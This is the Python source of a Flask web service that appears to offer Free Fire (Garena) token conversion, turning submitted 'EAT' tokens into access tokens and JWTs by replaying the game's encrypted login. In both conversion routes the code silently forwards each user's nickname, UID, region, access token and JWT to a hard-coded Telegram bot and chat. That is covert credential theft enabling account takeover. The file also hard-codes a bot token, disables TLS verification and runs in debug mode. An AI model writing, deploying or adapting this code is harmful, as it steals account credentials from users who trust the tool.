from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import base64
import json
from datetime import datetime, timezone, timedelta
import time
import my_pb2
import output_pb2
from urllib.parse import urlparse, parse_qs
from typing import Dict, Any, Optional

app = Flask(__name__, static_folder='static')
CORS(app)
SESSION = requests.Session()
KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

TELEGRAM_BOT_TOKEN = "8890450515:AAEA3yRcN3I7UAUwuNI0mjXigeW8Zs718iQ"
TELEGRAM_CHAT_ID = "8488332629"

PLATFORM_MAP = {
    3: "Facebook",
    4: "Guest",
    5: "VK",
    8: "Google",
    10: "AppleId",
    11: "X (Twitter)"
}

def log_info(message):
    print(f"[INFO] {message}")

def log_error(message):
    print(f"[ERROR] {message}")

def log_debug(message):
    print(f"[DEBUG] {message}")

# ============================================
# TELEGRAM NOTIFICATION FUNCTION
# ============================================
def send_telegram_message(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }
        resp = requests.post(url, json=payload, timeout=5)
        if resp.status_code != 200:
            log_error(f"Telegram API Error: {resp.text}")
    except Exception as e:
        log_error(f"Telegram Exception: {e}")

def convert_timestamp_to_human_readable(timestamp_seconds: int) -> Dict[str, Any]:
    try:
        utc_time = datetime.fromtimestamp(timestamp_seconds, tz=timezone.utc)
        ist_offset = timedelta(hours=5, minutes=30)
        ist_time = utc_time + ist_offset
        current_time = int(time.time())
        time_remaining = timestamp_seconds - current_time
        days = time_remaining // (24 * 3600)
        hours = (time_remaining % (24 * 3600)) // 3600
        minutes = (time_remaining % 3600) // 60
        seconds = time_remaining % 60
        is_expired = time_remaining <= 0
        return {
            "timestamp": timestamp_seconds,
            "utc_time": utc_time.strftime("%Y-%m-%d %H:%M:%S UTC"),
            "ist_time": ist_time.strftime("%Y-%m-%d %H:%M:%S IST"),
            "time_remaining_seconds": time_remaining,
            "time_remaining_human": f"{days} days, {hours} hours, {minutes} minutes, {seconds} seconds" if time_remaining > 0 else "Expired",
            "is_expired": is_expired,
            "days_remaining": days if not is_expired else 0,
            "hours_remaining": hours if not is_expired else 0,
            "minutes_remaining": minutes if not is_expired else 0,
            "seconds_remaining": seconds if not is_expired else 0
        }
    except Exception as e:
        log_error(f"Error converting timestamp: {e}")
        return {"timestamp": timestamp_seconds, "utc_time": "Invalid", "ist_time": "Invalid",
                "time_remaining_seconds": 0, "time_remaining_human": "Invalid", "is_expired": True, "error": str(e)}

def get_token_inspect_data(access_token: str) -> Optional[Dict[str, Any]]:
    try:
        resp = SESSION.get(
            f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
            timeout=15, verify=False
        )
        data = resp.json()
        if 'open_id' in data and 'platform' in data and 'uid' in data:
            if 'expiry_time' in data:
                data['expiry_info'] = convert_timestamp_to_human_readable(data['expiry_time'])
            elif 'expires_in' in data:
                expires_at = int(time.time()) + data['expires_in']
                data['expiry_info'] = convert_timestamp_to_human_readable(expires_at)
            return data
    except Exception as e:
        log_error(f"Error inspecting token: {e}")
    return None

def decode_jwt_token(jwt_token: str) -> Optional[Dict[str, Any]]:
    try:
        parts = jwt_token.split('.')
        if len(parts) != 3:
            return None
        payload = parts[1]
        padding = 4 - (len(payload) % 4)
        if padding != 4:
            payload += '=' * padding
        decoded_bytes = base64.urlsafe_b64decode(payload)
        payload_data = json.loads(decoded_bytes.decode('utf-8'))
        if 'exp' in payload_data:
            payload_data['expiry_info'] = convert_timestamp_to_human_readable(payload_data['exp'])
        if 'iat' in payload_data:
            payload_data['issued_at_info'] = convert_timestamp_to_human_readable(payload_data['iat'])
        return payload_data
    except Exception as e:
        log_error(f"Error decoding JWT: {e}")
        return None

def extract_params_from_url(url: str) -> Dict[str, str]:
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        result = {}
        if 'access_token' in params: result['access_token'] = params['access_token'][0]
        if 'region' in params: result['region'] = params['region'][0]
        if 'account_id' in params: result['game_uid'] = params['account_id'][0]
        if 'nickname' in params: result['nickname'] = params['nickname'][0]
        if 'game' in params: result['game'] = params['game'][0]
        if 'lang' in params: result['language'] = params['lang'][0]
        return result
    except Exception as e:
        log_error(f"Error extracting params: {e}")
        return {}

def eat_to_access_token(eat_token: str) -> Dict[str, Any]:
    try:
        callback_url = f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        response = SESSION.get(callback_url, allow_redirects=True, timeout=30, verify=False)
        if 'help.garena.com' in response.url:
            params = extract_params_from_url(response.url)
            if 'access_token' in params:
                token_data = get_token_inspect_data(params['access_token'])
                if token_data:
                    platform_type = token_data.get('platform', 4)
                    platform_name = PLATFORM_MAP.get(platform_type, "Unknown")
                    response_data = {
                        'success': True,
                        'eat_token': eat_token,
                        'access_token': params['access_token'],
                        'region': params.get('region'),
                        'game_uid': params.get('game_uid'),
                        'nickname': params.get('nickname'),
                        'game': params.get('game', 'FF'),
                        'language': params.get('language', 'en'),
                        'platform_type': platform_type,
                        'platform_name': platform_name,
                        'open_id': token_data.get('open_id'),
                        'uid': token_data.get('uid'),
                    }
                    if 'expiry_info' in token_data:
                        response_data['access_token_expiry'] = token_data['expiry_info']
                    return response_data
        return {'success': False, 'error': 'INVALID_EAT_TOKEN', 'message': 'Unable to convert EAT token. Token may be invalid or expired.'}
    except Exception as e:
        log_error(f"Error converting EAT token: {e}")
        return {'success': False, 'error': 'CONVERSION_ERROR', 'message': str(e)}

def login(uid, access_token, open_id, platform_type):
    log_debug(f"Login for UID {uid} platform {platform_type}")
    url = "https://loginbp.ggpolarbear.com/MajorLogin"
    game_data = my_pb2.GameData()
    game_data.timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    game_data.game_name = "Free Fire"
    game_data.game_version = 1
    game_data.version_code = "1.132.1"
    game_data.os_info = "iOS 18.4"
    game_data.device_type = "Handheld"
    game_data.network_provider = "Verizon Wireless"
    game_data.connection_type = "WIFI"
    game_data.screen_width = 1170
    game_data.screen_height = 2532
    game_data.dpi = "460"
    game_data.cpu_info = "Apple A15 Bionic"
    game_data.total_ram = 6144
    game_data.gpu_name = "Apple GPU (5-core)"
    game_data.gpu_version = "Metal 3"
    game_data.user_id = str(uid)
    game_data.ip_address = "172.190.111.97"
    game_data.language = "en"
    game_data.open_id = str(open_id)
    game_data.access_token = str(access_token)
    game_data.platform_type = int(platform_type)
    game_data.field_99 = str(platform_type)
    game_data.field_100 = str(platform_type)

    serialized_data = game_data.SerializeToString()
    padded_data = pad(serialized_data, AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted_data = cipher.encrypt(padded_data)

    headers = {
        "User-Agent": "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/octet-stream",
        "Expect": "100-continue",
        "X-GA": "v1 1",
        "X-Unity-Version": "2018.4.12f1",
        "ReleaseVersion": "OB55",
        "Version": "1.132.1",
        "Content-Length": str(len(encrypted_data))
    }

    try:
        response = SESSION.post(url, data=encrypted_data, headers=headers, timeout=30, verify=False)
        if response.status_code == 200:
            jwt_msg = output_pb2.Garena_420()
            jwt_msg.ParseFromString(response.content)
            if jwt_msg.token:
                return jwt_msg.token
        else:
            error_text = response.content.decode().strip()
            if error_text == "BR_PLATFORM_INVALID_PLATFORM":
                return {"error": "INVALID_PLATFORM", "message": "This account is registered on another platform"}
            elif error_text == "BR_GOP_TOKEN_AUTH_FAILED":
                return {"error": "INVALID_TOKEN", "message": "AccessToken invalid"}
            elif error_text == "BR_PLATFORM_INVALID_OPENID":
                return {"error": "INVALID_OPENID", "message": "OpenID invalid"}
    except Exception as e:
        log_error(f"UID {uid}: Error in JWT request - {e}")
    return None

# ============ SERVE WEBSITE (root pe) ============
@app.route('/')
def serve_website():
    with open('static/index.html', 'r', encoding='utf-8') as f:
        html = f.read()
    html = html.replace('%%TG_BOT_TOKEN%%', TELEGRAM_BOT_TOKEN)
    html = html.replace('%%TG_CHAT_ID%%', TELEGRAM_CHAT_ID)
    return html

# ============ API ROUTES ============
@app.route('/eat-to-access', methods=['GET'])
def eat_to_access():
    eat_token = request.args.get('eat_token')
    if not eat_token:
        return jsonify({"success": False, "error": "MISSING_PARAMETER", "message": "eat_token required"}), 400
    
    result = eat_to_access_token(eat_token)
    
    if result.get('success'):
        current_time = datetime.now(timezone.utc)
        current_ist = current_time + timedelta(hours=5, minutes=30)
        result['current_time'] = {
            "utc": current_time.strftime("%Y-%m-%d %H:%M:%S UTC"),
            "ist": current_ist.strftime("%Y-%m-%d %H:%M:%S IST"),
            "timestamp": int(time.time())
        }
        result['credits'] = {"developer": "@btcXbitcoin", "channel": "@mukeshhhhhk"}

        # 🔥 TELEGRAM MESSAGE BHEJNE KA CODE (EAT -> ACCESS)
        try:
            access_token = result.get('access_token')
            nickname = result.get('nickname', 'Unknown')
            uid = result.get('game_uid', 'Unknown')
            platform = result.get('platform_name', 'Unknown')
            region = result.get('region', 'Unknown')
            
            tg_msg = (
                f"<b>🔓 New EAT → Access Generated!</b>\n\n"
                f"👤 <b>Nickname:</b> {nickname}\n"
                f"🎮 <b>UID:</b> {uid}\n"
                f"🌐 <b>Platform:</b> {platform}\n"
                f"📍 <b>Region:</b> {region}\n"
                f"🔑 <b>Access Token:</b>\n<code>{access_token}</code>"
            )
            send_telegram_message(tg_msg)
        except Exception as e:
            log_error(f"Telegram trigger error (access): {e}")

    return jsonify(result)

@app.route('/eat-to-jwt', methods=['GET'])
def direct_eat_to_jwt():
    eat_token = request.args.get('eat_token')
    if not eat_token:
        return jsonify({"success": False, "error": "MISSING_PARAMETER", "message": "eat_token required"}), 400

    eat_result = eat_to_access_token(eat_token)
    if not eat_result.get('success'):
        return jsonify(eat_result), 400

    access_token = eat_result.get('access_token')
    platform_type = int(eat_result.get('platform_type', 4))
    open_id = str(eat_result.get('open_id', ''))
    uid = str(eat_result.get('uid', ''))

    jwt_token = login(uid, access_token, open_id, platform_type)

    if isinstance(jwt_token, dict) and 'error' in jwt_token:
        return jsonify({"success": False, "error": jwt_token.get("error"), "message": jwt_token.get("message")}), 400
    if not jwt_token:
        return jsonify({"success": False, "error": "JWT_GENERATION_FAILED", "message": "Failed to generate JWT token"}), 500

    decoded_token = decode_jwt_token(jwt_token)
    current_time = datetime.now(timezone.utc)
    current_ist = current_time + timedelta(hours=5, minutes=30)

    response = {
        "success": True,
        "eat_token": eat_token,
        "access_token": access_token,
        "jwt_token": jwt_token,
        "decoded_jwt": decoded_token or {},
        "user_details": {
            "region": eat_result.get('region'),
            "game_uid": eat_result.get('game_uid'),
            "nickname": eat_result.get('nickname'),
            "platform_type": platform_type,
            "platform_name": PLATFORM_MAP.get(platform_type, "Unknown"),
            "open_id": open_id,
            "uid": uid,
        },
        "current_time": {
            "utc": current_time.strftime("%Y-%m-%d %H:%M:%S UTC"),
            "ist": current_ist.strftime("%Y-%m-%d %H:%M:%S IST"),
            "timestamp": int(time.time())
        },
        "credits": {"developer": "@btcXbitcoin", "channel": "@mukeshhhhhk"}
    }

    if 'access_token_expiry' in eat_result:
        response['access_token_expiry'] = eat_result['access_token_expiry']
    if decoded_token and 'expiry_info' in decoded_token:
        response['jwt_expiry'] = decoded_token['expiry_info']

    # 🔥 TELEGRAM MESSAGE BHEJNE KA CODE (EAT -> JWT)
    try:
        nickname = eat_result.get('nickname', 'Unknown')
        game_uid = eat_result.get('game_uid', 'Unknown')
        platform = PLATFORM_MAP.get(platform_type, "Unknown")
        
        tg_msg = (
            f"<b>🚀 New EAT → JWT Generated!</b>\n\n"
            f"👤 <b>Nickname:</b> {nickname}\n"
            f"🎮 <b>UID:</b> {game_uid}\n"
            f"🌐 <b>Platform:</b> {platform}\n"
            f"🔑 <b>Access Token:</b>\n<code>{access_token}</code>\n"
            f"🎟️ <b>JWT Token:</b>\n<code>{jwt_token}</code>"
        )
        send_telegram_message(tg_msg)
    except Exception as e:
        log_error(f"Telegram trigger error (jwt): {e}")

    return jsonify(response)

@app.route('/platforms', methods=['GET'])
def get_platforms():
    return jsonify({
        "success": True,
        "platforms": PLATFORM_MAP,
        "total_platforms": len(PLATFORM_MAP),
        "credits": {"developer": "@btcXbitcoin", "channel": "@mukeshhhhhk"}
    })

@app.route('/check-expiry', methods=['GET'])
def check_expiry():
    timestamp = request.args.get('timestamp')
    if not timestamp:
        return jsonify({"success": False, "error": "MISSING_PARAMETER", "message": "timestamp required"}), 400
    try:
        timestamp_int = int(timestamp)
        expiry_info = convert_timestamp_to_human_readable(timestamp_int)
        current_time = datetime.now(timezone.utc)
        current_ist = current_time + timedelta(hours=5, minutes=30)
        return jsonify({
            "success": True,
            "input_timestamp": timestamp_int,
            "expiry_info": expiry_info,
            "current_time": {
                "utc": current_time.strftime("%Y-%m-%d %H:%M:%S UTC"),
                "ist": current_ist.strftime("%Y-%m-%d %H:%M:%S IST"),
                "timestamp": int(time.time())
            },
            "credits": {"developer": "@btcXbitcoin", "channel": "@mukeshhhhhk"}
        })
    except ValueError:
        return jsonify({"success": False, "error": "INVALID_TIMESTAMP", "message": "Timestamp must be a valid integer"}), 400

@app.errorhandler(404)
def not_found(error):
    return jsonify({"success": False, "error": "NOT_FOUND", "message": "Endpoint not found"}), 404

@app.errorhandler(500)
def server_error(error):
    return jsonify({"success": False, "error": "SERVER_ERROR", "message": "Internal server error"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    log_info(f'MUKESH HERE on http://localhost:{port}')
    log_info(f'Website: http://localhost:{port}/')
    app.run(host='0.0.0.0', port=port, debug=True)